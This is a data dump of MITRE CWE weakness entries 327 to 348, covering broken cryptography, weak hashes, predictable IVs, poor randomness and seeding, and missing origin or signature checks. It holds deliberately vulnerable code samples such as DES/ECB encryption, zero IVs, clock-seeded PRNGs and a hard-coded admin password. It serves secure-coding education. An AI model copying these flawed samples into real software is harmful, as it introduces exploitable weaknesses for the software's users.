CWE-327: Use of a Broken or Risky Cryptographic Algorithm,The product uses a broken or risky cryptographic algorithm or protocol.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataThe confidentiality of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application DataThe integrity of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm., Likelihood: ; Scope: AccountabilityNon-Repudiation, Impact: Technical Impact:Hide ActivitiesIf the cryptographic algorithm is used to ensure the identity of the source of the data (such as digital signatures), then a broken algorithm will compromise this scheme and the source of the data cannot be proven., Likelihood: ","Example 1These code examples use the Data Encryption Standard (DES).(bad code)Example Language:CEVP_des_ecb();(bad code)Example Language:JavaCipher des=Cipher.getInstance(""DES..."");des.initEncrypt(key2);(bad code)Example Language:PHPfunction encryptPassword($password){$iv_size = mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_ECB);$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);$key = ""This is a password encryption key"";$encryptedPassword = mcrypt_encrypt(MCRYPT_DES, $key, $password, MCRYPT_MODE_ECB, $iv);return $encryptedPassword;}Once considered a strong algorithm, DES now regarded as insufficient for many applications. It has been replaced by Advanced Encryption Standard (AES).Example 2Suppose a chip manufacturer decides to implement a hashing scheme for verifying integrity property of certain bitstream, and it chooses to implement a SHA1 hardware accelerator for to implement the scheme.(bad code)Example Language:OtherThe manufacturer chooses a SHA1 hardware accelerator for to implement the scheme because it already has a working SHA1 Intellectual Property (IP) that the manufacturer had created and used earlier, so this reuse of IP saves design cost.However, SHA1 was theoretically broken in 2005 and practically broken in 2017 at a cost of $110K. This means an attacker with access to cloud-rented computing power will now be able to provide a malicious bitstream with the same hash value, thereby defeating the purpose for which the hash was used.This issue could have been avoided with better design.(good code)Example Language:OtherThe manufacturer could have chosen a cryptographic solution that is recommended by the wide security community (including standard-setting bodies like NIST) and is not expected to be broken (or even better, weakened) within the reasonable life expectancy of the hardware product. In this case, the architects could have used SHA-2 or SHA-3, even if it meant that such choice would cost extra.Example 3In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.Multiple OT products used weak cryptography.","Phase:  Architecture and DesignStrategy:  Libraries or FrameworksWhen there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.For example, US government systems require FIPS 140-2 certification [REF-1192].Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]Phase:  Architecture and DesignEnsure that the design allows one cryptographic algorithm to be replaced with another in the next generation or version. Where possible, use wrappers to make the interfaces uniform. This will make it easier to upgrade to stronger algorithms. With hardware, design the product at the Intellectual Property (IP) level so that one cryptographic algorithm can be replaced with another in the next generation of the hardware product.Effectiveness: Defense in DepthPhase:  Architecture and DesignCarefully manage and protect cryptographic keys (seeCWE-320). If the keys can be guessed or stolen, then the strength of the cryptography itself is irrelevant.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Industry-standard implementations will save development time and may be more likely to avoid errors that can occur during implementation of cryptographic algorithms. Consider the ESAPI Encryption feature.Phases:  Implementation; Architecture and DesignWhen using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."
CWE-328: Use of Weak Hash,"The product uses an algorithm that produces a digest (output value) that does not meet security expectations for a hash function that allows an adversary to reasonably determine the original input (preimage attack), find another input that can produce the same hash (2nd preimage attack), or find multiple inputs that evaluate to the same hash (birthday attack).","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1In both of these examples, a user is logged in if their given password matches a stored password:(bad code)Example Language:Cunsigned char *check_passwd(char *plaintext) {ctext = simple_digest(""sha1"",plaintext,strlen(plaintext), ... );//Login if hash matches stored hashif (equal(ctext, secret_password())) {login_user();}}(bad code)Example Language:JavaString plainText = new String(plainTextIn);MessageDigest encer = MessageDigest.getInstance(""SHA"");encer.update(plainTextIn);byte[] digest = password.digest();//Login if hash matches stored hashif (equal(digest,secret_password())) {login_user();}This code relies exclusively on a password mechanism (CWE-309) using only one factor of authentication (CWE-308). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (CWE-328). It also does not use a salt (CWE-759).Example 2In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.At least one OT product used weak hashes.Example 3The example code below is taken from the JTAG access control mechanism of the Hack@DAC'21 buggy OpenPiton SoC [REF-1360]. Access to JTAG allows users to access sensitive information in the system. Hence, access to JTAG is controlled using cryptographic authentication of the users. In this example (see the vulnerable code source), the password checker uses HMAC-SHA256 for authentication. It takes a 512-bit secret message from the user, hashes it using HMAC, and compares its output with the expected output to determine the authenticity of the user.(bad code)Example Language:Verilog...logic [31:0] data_d,data_qlogic [512-1:0] pass_data;...Write: begin...if (pass_mode) beginpass_data = { {60{8'h00}}, data_d};state_d = PassChk;pass_mode = 1'b0;...end...The vulnerable code shows an incorrect implementation of the HMAC authentication where it only uses the least significant 32 bits of the secret message for the authentication (the remaining 480 bits are hard coded as zeros). As a result, the system is susceptible to brute-force attacks where the attacker only needs to determine 32 bits of the secret message instead of 512 bits, weakening the cryptographic protocol.To mitigate, remove the zero padding and use all 512 bits of the secret message for HMAC authentication [REF-1361].(good code)Example Language:Verilog...logic [512-1:0] data_d,data_qlogic [512-1:0] pass_data;...Write: begin...if (pass_mode) beginpass_data = data_d;state_d = PassChk;pass_mode = 1'b0;...end...","Phase:  Architecture and DesignUse an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (""stretching"") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.Effectiveness: High"
CWE-329: Generation of Predictable IV with CBC Mode,"The product generates and uses a predictable initialization Vector (IV) with Cipher Block Chaining (CBC) Mode, which causes algorithms to be susceptible to dictionary attacks when they are encrypted under the same key.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataIf the IV is not properly initialized, data that is encrypted can be compromised and leak information., Likelihood: ","Example 1In the following examples, CBC mode is used when encrypting data:(bad code)Example Language:CEVP_CIPHER_CTX ctx;char key[EVP_MAX_KEY_LENGTH];char iv[EVP_MAX_IV_LENGTH];RAND_bytes(key, b);memset(iv,0,EVP_MAX_IV_LENGTH);EVP_EncryptInit(&ctx,EVP_bf_cbc(), key,iv);(bad code)Example Language:Javapublic class SymmetricCipherTest {public static void main() {byte[] text =""Secret"".getBytes();byte[] iv ={0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};KeyGenerator kg = KeyGenerator.getInstance(""DES"");kg.init(56);SecretKey key = kg.generateKey();Cipher cipher = Cipher.getInstance(""DES/CBC/PKCS5Padding"");IvParameterSpec ips = new IvParameterSpec(iv);cipher.init(Cipher.ENCRYPT_MODE, key, ips);return cipher.doFinal(inpBytes);}}In both of these examples, the initialization vector (IV) is always a block of zeros. This makes the resulting cipher text much more predictable and susceptible to a dictionary attack.","Phase:  ImplementationNIST recommends two methods of generating unpredictable IVs for CBC mode [REF-1172]. The first is to generate the IV randomly. The second method is to encrypt a nonce with the same key and cipher to be used to encrypt the plaintext. In this case the nonce must be unique but can be predictable, since the block cipher will act as a pseudo random permutation."
CWE-330: Use of Insufficiently Random Values,The product uses insufficiently random numbers or values in a security context that depends on unpredictable numbers.,"Scope: ConfidentialityOther, Impact: Technical Impact:OtherWhen a protection mechanism relies on random values to restrict access to a sensitive resource, such as a session ID or a seed for generating a cryptographic key, then the resource being protected could be accessed by guessing the ID or key., Likelihood: ; Scope: Access ControlOther, Impact: Technical Impact:Bypass Protection Mechanism; OtherIf product relies on unique, unguessable IDs to identify a resource, an attacker might be able to guess an ID for a resource that is owned by another user. The attacker could then read the resource, or pre-create a resource with the same ID to prevent the legitimate program from properly sending the resource to the intended user. For example, a product might maintain session information in a file whose name is based on a username. An attacker could pre-create this file for a victim user, then set the permissions so that the application cannot generate the session for the victim, preventing the victim from using the application., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityWhen an authorization or authentication mechanism relies on random values to restrict access to restricted functionality, such as a session ID or a seed for generating a cryptographic key, then an attacker may access the restricted functionality by guessing the ID or key., Likelihood: ","Example 1This code attempts to generate a unique random identifier for a user's session.(bad code)Example Language:PHPfunction generateSessionID($userID){srand($userID);return rand();}Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.This example also exhibits a Small Seed Space (CWE-339).Example 2The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.(bad code)Example Language:JavaString GenerateReceiptURL(String baseUrl) {Random ranGen = new Random();ranGen.setSeed((new Date()).getTime());return(baseUrl + ranGen.nextInt(400000000) + "".html"");}This code uses the Random.nextInt() function to generate ""unique"" identifiers for the receipt pages it generates. Because Random.nextInt() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.","Phase:  Architecture and DesignUse a well-vetted algorithm that is currently considered to be strong by experts in the field, and select well-tested implementations with adequate length seeds.In general, if a pseudo-random number generator is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts.Pseudo-random number generators can produce predictable numbers if the generator is known and the seed can be guessed. A 256-bit seed is a good starting point for producing a ""random enough"" number.Phase:  ImplementationConsider a PRNG that re-seeds itself as needed from high quality pseudo-random output sources, such as hardware devices.Phase:  TestingUse automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.Phases:  Architecture and Design; RequirementsStrategy:  Libraries or FrameworksUse products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (""Approved Random Number Generators"").Phase:  TestingUse tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."
CWE-331: Insufficient Entropy,"The product uses an algorithm or scheme that produces insufficient entropy, leaving patterns or clusters of values that are more likely to occur than others.","Scope: Access ControlOther, Impact: Technical Impact:Bypass Protection Mechanism; OtherAn attacker could guess the random numbers generated and could gain unauthorized access to a system if the random numbers are used for authentication and authorization., Likelihood: ","Example 1This code generates a unique random identifier for a user's session.(bad code)Example Language:PHPfunction generateSessionID($userID){srand($userID);return rand();}Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.This example also exhibits a Small Seed Space (CWE-339).Example 2The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.(bad code)Example Language:JavaString GenerateReceiptURL(String baseUrl) {Random ranGen = new Random();ranGen.setSeed((new Date()).getTime());return(baseUrl + ranGen.nextInt(400000000) + "".html"");}This code uses the Random.nextInt() function to generate ""unique"" identifiers for the receipt pages it generates. Because Random.nextInt() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.",Phase:  ImplementationDetermine the necessary entropy to adequately provide for randomness and predictability. This can be achieved by increasing the number of bits of objects such as keys and seeds.
CWE-332: Insufficient Entropy in PRNG,"The lack of entropy available for, or used by, a Pseudo-Random Number Generator (PRNG) can be a stability and security threat.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartIf a pseudo-random number generator is using a limited entropy source which runs out (if the generator fails closed), the program may pause or crash., Likelihood: ; Scope: Access ControlOther, Impact: Technical Impact:Bypass Protection Mechanism; OtherIf a PRNG is using a limited entropy source which runs out, and the generator fails open, the generator could produce predictable random numbers. Potentially a weak source of random numbers could weaken the encryption method used for authentication of users., Likelihood: ",无示范例子,"Phases:  Architecture and Design; RequirementsStrategy:  Libraries or FrameworksUse products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (""Approved Random Number Generators"").Phase:  ImplementationConsider a PRNG that re-seeds itself as needed from high-quality pseudo-random output, such as hardware devices.Phase:  Architecture and DesignWhen deciding which PRNG to use, look at its sources of entropy. Depending on what your security needs are, you may need to use a random number generator that always uses strong random data -- i.e., a random number generator that attempts to be strong but will fail in a weak way or will always provide some middle ground of protection through techniques like re-seeding. Generally, something that always provides a predictable amount of strength is preferable."
CWE-333: Improper Handling of Insufficient Entropy in TRNG,True random number generators (TRNG) generally have a limited source of entropy and therefore can fail or block.,"Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartA program may crash or block if it runs out of random numbers., Likelihood: ",Example 1This code uses a TRNG to generate a unique session id for new connections to a server:(bad code)Example Language:Cwhile (1){if (haveNewConnection()){if (hwRandom()){int sessionID = hwRandom();createNewConnection(sessionID);} } }This code does not attempt to limit the number of new connections or make sure the TRNG can successfully generate a new random number. An attacker may be able to create many new connections and exhaust the entropy of the TRNG. The TRNG may then block and cause the program to crash or hang.,"Phase:  ImplementationRather than failing on a lack of random numbers, it is often preferable to wait for more numbers to be created."
CWE-334: Small Space of Random Values,"The number of possible random values is smaller than needed by the product, making it more susceptible to brute force attacks.","Scope: Access ControlOther, Impact: Technical Impact:Bypass Protection Mechanism; OtherAn attacker could easily guess the values used. This could lead to unauthorized access to a system if the seed is used for authentication and authorization., Likelihood: ","Example 1The following XML example code is a deployment descriptor for a Java web application deployed on a Sun Java Application Server. This deployment descriptor includes a session configuration property for configuring the session ID length.(bad code)Example Language:XML<sun-web-app>...<session-config><session-properties><property name=""idLengthBytes"" value=""8""><description>The number of bytes in this web module's session ID.</description></property></session-properties></session-config>...</sun-web-app>This deployment descriptor has set the session ID length for this Java web application to 8 bytes (or 64 bits). The session ID length for Java web applications should be set to 16 bytes (128 bits) to prevent attackers from guessing and/or stealing a session ID and taking over a user's session.Note for most application servers including the Sun Java Application Server the session ID length is by default set to 128 bits and should not be changed. And for many application servers the session ID length cannot be changed from this default setting. Check your application server documentation for the session ID length default setting and configuration options to ensure that the session ID length is set to 128 bits.","Phases:  Architecture and Design; RequirementsStrategy:  Libraries or FrameworksUse products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (""Approved Random Number Generators"")."
CWE-335: Incorrect Usage of Seeds in Pseudo-Random Number Generator (PRNG),The product uses a Pseudo-Random Number Generator (PRNG) but does not correctly manage seeds.,"Scope: Access ControlOther, Impact: Technical Impact:Bypass Protection Mechanism; OtherIf a PRNG is used incorrectly, such as using the same seed for each initialization or using a predictable seed, then an attacker may be able to easily guess the seed and thus the random numbers. This could lead to unauthorized access to a system if the seed is used for authentication and authorization., Likelihood: ","Example 1The following code uses a statistical PRNG to generate account IDs.(bad code)Example Language:Javaprivate static final long SEED = 1234567890;public int generateAccountID() {Random random = new Random(SEED);return random.nextInt();}Because the program uses the same seed value for every invocation of the PRNG, its values are predictable, making the system vulnerable to attack.Example 2Both of these examples use a statistical PRNG seeded with the current value of the system clock to generate a random number:(bad code)Example Language:JavaRandom random = new Random(System.currentTimeMillis());int accountID = random.nextInt();(bad code)Example Language:Csrand(time());int randNum = rand();An attacker can easily predict the seed used by these PRNGs, and so also predict the stream of random numbers generated. Note these examples also exhibitCWE-338(Use of Cryptographically Weak PRNG).Example 3This code grabs some random bytes and uses them for a seed in a PRNG, in order to generate a new cryptographic key.(bad code)Example Language:Python# getting 2 bytes of randomness for the seeding the PRNGseed = os.urandom(2)random.seed(a=seed)key = random.getrandbits(128)Since only 2 bytes are used as a seed, an attacker will only need to guess 2^16 (65,536) values before being able to replicate the state of the PRNG.",无可能的缓解方案
CWE-336: Same Seed in Pseudo-Random Number Generator (PRNG),A Pseudo-Random Number Generator (PRNG) uses the same seed each time the product is initialized.,"Scope: OtherAccess Control, Impact: Technical Impact:Other; Bypass Protection Mechanism, Likelihood: ","Example 1The following code uses a statistical PRNG to generate account IDs.(bad code)Example Language:Javaprivate static final long SEED = 1234567890;public int generateAccountID() {Random random = new Random(SEED);return random.nextInt();}Because the program uses the same seed value for every invocation of the PRNG, its values are predictable, making the system vulnerable to attack.Example 2This code attempts to generate a unique random identifier for a user's session.(bad code)Example Language:PHPfunction generateSessionID($userID){srand($userID);return rand();}Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.If the user IDs are generated sequentially, or otherwise restricted to a narrow range of values, then this example also exhibits a Small Seed Space (CWE-339).","Phase:  Architecture and DesignDo not reuse PRNG seeds. Consider a PRNG that periodically re-seeds itself as needed from a high quality pseudo-random output, such as hardware devices.Phases:  Architecture and Design; RequirementsStrategy:  Libraries or FrameworksUse products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems, or use the more recent FIPS 140-3 [REF-1192] if possible."
CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG),"A Pseudo-Random Number Generator (PRNG) is initialized from a predictable seed, such as the process ID or system time.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1Both of these examples use a statistical PRNG seeded with the current value of the system clock to generate a random number:(bad code)Example Language:JavaRandom random = new Random(System.currentTimeMillis());int accountID = random.nextInt();(bad code)Example Language:Csrand(time());int randNum = rand();An attacker can easily predict the seed used by these PRNGs, and so also predict the stream of random numbers generated. Note these examples also exhibitCWE-338(Use of Cryptographically Weak PRNG).","Use non-predictable inputs for seed generation.Phases:  Architecture and Design; RequirementsStrategy:  Libraries or FrameworksUse products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems, or use the more recent FIPS 140-3 [REF-1192] if possible.Phase:  ImplementationUse a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block."
CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG),"The product uses a Pseudo-Random Number Generator (PRNG) in a security context, but the PRNG's algorithm is not cryptographically strong.","Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIf a PRNG is used for authentication and authorization, such as a session ID or a seed for generating a cryptographic key, then an attacker may be able to easily guess the ID or cryptographic key and gain access to restricted functionality., Likelihood: ","Example 1Both of these examples use a statistical PRNG seeded with the current value of the system clock to generate a random number:(bad code)Example Language:JavaRandom random = new Random(System.currentTimeMillis());int accountID = random.nextInt();(bad code)Example Language:Csrand(time());int randNum = rand();The random number functions used in these examples, rand() and Random.nextInt(), are not considered cryptographically strong. An attacker may be able to predict the random numbers generated by these functions. Note that these example also exhibitCWE-337(Predictable Seed in PRNG).","Phase:  ImplementationUse functions or hardware which use a hardware-based random number generation for all crypto. This is the recommended solution. Use CyptGenRandom on Windows, or hw_rand() on Linux."
CWE-339: Small Seed Space in PRNG,"A Pseudo-Random Number Generator (PRNG) uses a relatively small seed space, which makes it more susceptible to brute force attacks.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1This code grabs some random bytes and uses them for a seed in a PRNG, in order to generate a new cryptographic key.(bad code)Example Language:Python# getting 2 bytes of randomness for the seeding the PRNGseed = os.urandom(2)random.seed(a=seed)key = random.getrandbits(128)Since only 2 bytes are used as a seed, an attacker will only need to guess 2^16 (65,536) values before being able to replicate the state of the PRNG.","Phase:  Architecture and DesignUse well vetted pseudo-random number generating algorithms with adequate length seeds. Pseudo-random number generators can produce predictable numbers if the generator is known and the seed can be guessed. A 256-bit seed is a good starting point for producing a ""random enough"" number.Phases:  Architecture and Design; RequirementsStrategy:  Libraries or FrameworksUse products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems, or use the more recent FIPS 140-3 [REF-1192] if possible."
CWE-340: Generation of Predictable Numbers or Identifiers,The product uses a scheme that generates numbers or identifiers that are more predictable than required.,"Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1This code generates a unique random identifier for a user's session.(bad code)Example Language:PHPfunction generateSessionID($userID){srand($userID);return rand();}Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.This example also exhibits a Small Seed Space (CWE-339).",无可能的缓解方案
CWE-341: Predictable from Observable State,"A number or object is predictable based on observations that the attacker can make about the state of the system or network, such as time, process ID, etc.","Scope: Other, Impact: Technical Impact:Varies by ContextThis weakness could be exploited by an attacker in a number ways depending on the context. If a predictable number is used to generate IDs or keys that are used within protection mechanisms, then an attacker could gain unauthorized access to the system. If predictable filenames are used for storing sensitive information, then an attacker might gain access to the system and may be able to gain access to the information in the file., Likelihood: ","Example 1This code generates a unique random identifier for a user's session.(bad code)Example Language:PHPfunction generateSessionID($userID){srand($userID);return rand();}Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.This example also exhibits a Small Seed Space (CWE-339).","Phase:  ImplementationIncrease the entropy used to seed a PRNG.Phases:  Architecture and Design; RequirementsStrategy:  Libraries or FrameworksUse products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (""Approved Random Number Generators"").Phase:  ImplementationUse a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block."
CWE-342: Predictable Exact Value from Previous Values,An exact value or random number can be precisely predicted by observing previous values.,"Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,"Increase the entropy used to seed a PRNG.Phases:  Architecture and Design; RequirementsStrategy:  Libraries or FrameworksUse products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (""Approved Random Number Generators"").Phase:  ImplementationUse a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block."
CWE-343: Predictable Value Range from Previous Values,"The product's random number generator produces a series of values which, when observed, can be used to infer a relatively small range of possibilities for the next value that could be generated.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ",无示范例子,"Increase the entropy used to seed a PRNG.Phases:  Architecture and Design; RequirementsStrategy:  Libraries or FrameworksUse products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C (""Approved Random Number Generators"").Phase:  ImplementationUse a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block."
CWE-344: Use of Invariant Value in Dynamically Changing Context,"The product uses a constant value, name, or reference, but this value can (or should) vary across different environments.","Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1The following code is an example of an internal hard-coded password in the back-end:(bad code)Example Language:Cint VerifyAdmin(char *password) {if (strcmp(password, ""Mew!"")) {printf(""Incorrect Password!\n"");return(0)}printf(""Entering Diagnostic Mode...\n"");return(1);}(bad code)Example Language:Javaint VerifyAdmin(String password) {if (!password.equals(""Mew!"")) {return(0)}//Diagnostic Modereturn(1);}Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this ""functionality.""Example 2This code assumes a particular function will always be found at a particular address. It assigns a pointer to that address and calls the function.(bad code)Example Language:Cint (*pt2Function) (float, char, char)=0x08040000;int result2 = (*pt2Function) (12, 'a', 'b');// Here we can inject code to execute.The same function may not always be found at the same memory address. This could lead to a crash, or an attacker may alter the memory at the expected address, leading to arbitrary code execution.",无可能的缓解方案
CWE-345: Insufficient Verification of Data Authenticity,"The product does not sufficiently verify the origin or authenticity of data, in a way that causes it to accept invalid data.","Scope: IntegrityOther, Impact: Technical Impact:Varies by Context; Unexpected State, Likelihood: ","Example 1In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.Multiple vendors did not sign firmware images.",无可能的缓解方案
CWE-346: Origin Validation Error,The product does not properly verify that the source of data or communication is valid.,"Scope: Access ControlOther, Impact: Technical Impact:Gain Privileges or Assume Identity; Varies by ContextAn attacker can access any functionality that is inadvertently accessible to the source., Likelihood: ","Example 1This Android application will remove a user account when it receives an intent to do so:(bad code)Example Language:JavaIntentFilter filter = new IntentFilter(""com.example.RemoveUser"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);public class DeleteReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {int userID = intent.getIntExtra(""userID"");destroyUserData(userID);}}This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file.Example 2These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:(bad code)Example Language:Java// Android@Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url){if (url.substring(0,14).equalsIgnoreCase(""examplescheme:"")){if(url.substring(14,25).equalsIgnoreCase(""getUserInfo"")){writeDataToView(view, UserData);return false;}else{return true;}}}(bad code)Example Language:Objective-C// iOS-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType{NSURL *URL = [exRequest URL];if ([[URL scheme] isEqualToString:@""exampleScheme""]){NSString *functionString = [URL resourceSpecifier];if ([functionString hasPrefix:@""specialFunction""]){// Make data available back in webview.UIWebView *webView = [self writeDataToView:[URL query]];}return NO;}return YES;}A call into native code can then be initiated by passing parameters within the URL:(attack code)Example Language:JavaScriptwindow.location = examplescheme://method?parameter=valueBecause the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site.",无可能的缓解方案
CWE-347: Improper Verification of Cryptographic Signature,"The product does not verify, or incorrectly verifies, the cryptographic signature for data.","Scope: Access ControlIntegrityConfidentiality, Impact: Technical Impact:Gain Privileges or Assume Identity; Modify Application Data; Execute Unauthorized Code or CommandsAn attacker could gain access to sensitive data and possibly execute unauthorized code., Likelihood: ","Example 1In the following code, a JarFile object is created from a downloaded file.(bad code)Example Language:JavaFile f = new File(downloadedFilePath);JarFile jf = new JarFile(f);The JAR file that was potentially downloaded from an untrusted source is created without verifying the signature (if present). An alternate constructor that accepts a boolean verify parameter should be used instead.",无可能的缓解方案
CWE-348: Use of Less Trusted Source,"The product has two different sources of the same data or information, but it uses the source that has less support for verification, is less trusted, or is less resistant to attack.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityAn attacker could utilize the untrusted data source to bypass protection mechanisms and gain access to sensitive data., Likelihood: ","Example 1This code attempts to limit the access of a page to certain IP Addresses. It checks the 'HTTP_X_FORWARDED_FOR' header in case an authorized user is sending the request through a proxy.(bad code)Example Language:PHP$requestingIP = '0.0.0.0';if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {$requestingIP = $_SERVER['HTTP_X_FORWARDED_FOR'];else{$requestingIP = $_SERVER['REMOTE_ADDR'];}if(in_array($requestingIP,$ipAllowlist)){generatePage();return;}else{echo ""You are not authorized to view this page"";return;}The 'HTTP_X_FORWARDED_FOR' header can be user controlled and so should never be trusted. An attacker can falsify the header to gain access to the page.This fixed code only trusts the 'REMOTE_ADDR' header and so avoids the issue:(good code)Example Language:PHP$requestingIP = '0.0.0.0';if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {echo ""This application cannot be accessed through a proxy."";return;else{$requestingIP = $_SERVER['REMOTE_ADDR'];}...Be aware that 'REMOTE_ADDR' can still be spoofed. This may seem useless because the server will send the response to the fake address and not the attacker, but this may still be enough to conduct an attack. For example, if the generatePage() function in this code is resource intensive, an attacker could flood the server with fake requests using an authorized IP and consume significant resources. This could be a serious DoS attack even though the attacker would never see the page's sensitive content.",无可能的缓解方案
